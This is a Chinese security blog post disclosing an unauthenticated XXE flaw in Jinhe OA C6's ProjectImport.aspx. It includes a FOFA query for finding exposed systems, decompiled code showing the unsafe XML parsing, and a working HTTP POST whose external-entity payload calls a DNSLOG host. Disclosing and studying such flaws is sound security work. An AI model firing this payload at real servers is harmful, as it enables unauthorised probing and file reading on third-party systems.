---
title: "金和OA ProjectImport.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ContractManagement-ProjectImport-xxe.html
asset_dir: assets/金和oa-projectimport.aspx-xxe漏洞
---

# 金和OA ProjectImport.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/7 13:31
* 281浏览
* [0评论](#comment)
* 12分钟阅读

深入探索

数据库

服务器

授权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ProjectImport.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ProjectImport.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ContractManagement.dll` 将其进行反编译后找到 **ProjectImport** 的处理逻辑

深入探索

物流软件安全

防火墙软件

SQL注入防护

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.IsPostBack)
    return;
  ((Control) this).Page.Response.Write(this.ImportData());
  ((Control) this).Page.Response.End();
}
```

跟进 `ImportData` 方法

```
protected string ImportData()
{
  string str1 = string.Empty;
  DateTime now = DateTime.Now;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  XmlNode documentElement = (XmlNode) xmlDocument.DocumentElement;
```

深入探索

Web安全书籍

安全研究工具

编程语言教程

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.ContractManagement/Importing/ProjectImport.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA ProjectImport.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA ProjectImport.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-ContractManagement-ProjectImport-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-ContractManagement-ProjectImport-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ContractManagement-ProjectImport-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


